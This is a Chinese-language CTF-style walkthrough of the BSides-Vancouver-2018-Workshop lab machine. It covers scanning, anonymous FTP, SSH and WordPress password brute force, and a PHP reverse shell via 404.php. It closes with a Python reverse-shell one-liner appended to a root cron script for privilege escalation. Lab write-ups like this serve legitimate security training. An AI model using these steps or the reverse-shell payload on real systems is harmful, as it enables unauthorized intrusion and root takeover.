---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 BSides-Vancouver-2018-Workshop Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-04-04
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public
---



扫描ip

```
└─$ nmap -sP 192.168.182.0/24         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:31 EDT
Nmap scan report for 192.168.182.2
Host is up (0.00042s latency).
Nmap scan report for 192.168.182.128
Host is up (0.00021s latency).
Nmap scan report for 192.168.182.131
Host is up (0.00074s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 15.73 seconds
```

扫描目标

```
┌──(kali㉿kali)-[/tmp]
└─$ nmap -T5 -A -v -p- 192.168.182.131                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:30 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating Ping Scan at 11:30
Scanning 192.168.182.131 [2 ports]
Completed Ping Scan at 11:30, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:30
Completed Parallel DNS resolution of 1 host. at 11:31, 13.01s elapsed
Initiating Connect Scan at 11:31
Scanning 192.168.182.131 [65535 ports]
Discovered open port 80/tcp on 192.168.182.131
Discovered open port 21/tcp on 192.168.182.131
Discovered open port 22/tcp on 192.168.182.131
Completed Connect Scan at 11:31, 2.20s elapsed (65535 total ports)
Initiating Service scan at 11:31
Scanning 3 services on 192.168.182.131
Completed Service scan at 11:31, 6.02s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.182.131.
Initiating NSE at 11:31
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 11:31, 0.52s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.01s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Nmap scan report for 192.168.182.131
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.182.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)
|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)
|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/backup_wordpress
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds

```

## 方法一

有21端口，尝试用匿名账号登录

![image-20220421180049816](/assets/img/image-20220421180049816.png)

发现users.txt.bk 文件夹，下载后查看内容，有5个用户名

用这5个用户进行ssh爆破，anne用户爆破成功

![image-20220421180055966](/assets/img/image-20220421180055966.png)

登陆后发现anne在sudo组，sudo 提权成功

![image-20220421180100595](/assets/img/image-20220421180100595.png)

## 方法二

```bash
┌──(kali㉿kali)-[/tmp]
└─$ nikto -host 192.168.182.131
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.182.131
+ Target Hostname:    192.168.182.131
+ Target Port:        80
+ Start Time:         2022-04-04 11:46:51 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 2140, size: 177, mtime: Sat Mar  3 14:17:59 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
+ Uncommon header 'link' found, with contents: </backup_wordpress/?rest_route=/>; rel="https://api.w.org/"
+ Entry '/backup_wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8726 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-04-04 11:47:21 (GMT-4) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

发现robots.txt,查看内容

![image-20220421180107562](/assets/img/image-20220421180107562.png)

发现扫描结果中提到的/backup_wordpress/，访问后发现是wordpress

![image-20220421180111810](/assets/img/image-20220421180111810.png)

扫描用户

```bash
wpscan --url http://192.168.182.131/backup_wordpress --enumerate u
```

![image-20220421180117176](/assets/img/image-20220421180117176.png)

发现john和admin

爆破john，发现密码

![image-20220421180122247](/assets/img/image-20220421180122247.png)

登录wordpress，修改404.php，反弹shell

![image-20220421180126723](/assets/img/image-20220421180126723.png)

kali监听 nc -nlvp 4444

访问http://192.168.56.107/backup_wordpress/wp-content/themes/twentysixteen/404.php，获得反弹shell

![image-20220421180132578](/assets/img/image-20220421180132578.png)

尝试内核提权和suid提权都没有成功，查看调度任务

![image-20220421180137224](/assets/img/image-20220421180137224.png)

发现root权限执行cleanup脚本，查看cleanup

![image-20220421180141923](/assets/img/image-20220421180141923.png)

在cleanup后面添加一行，反弹shell代码

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.128",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

稍等几分钟，自动反弹，获得root权限

![image-20220421180146579](/assets/img/image-20220421180146579.png)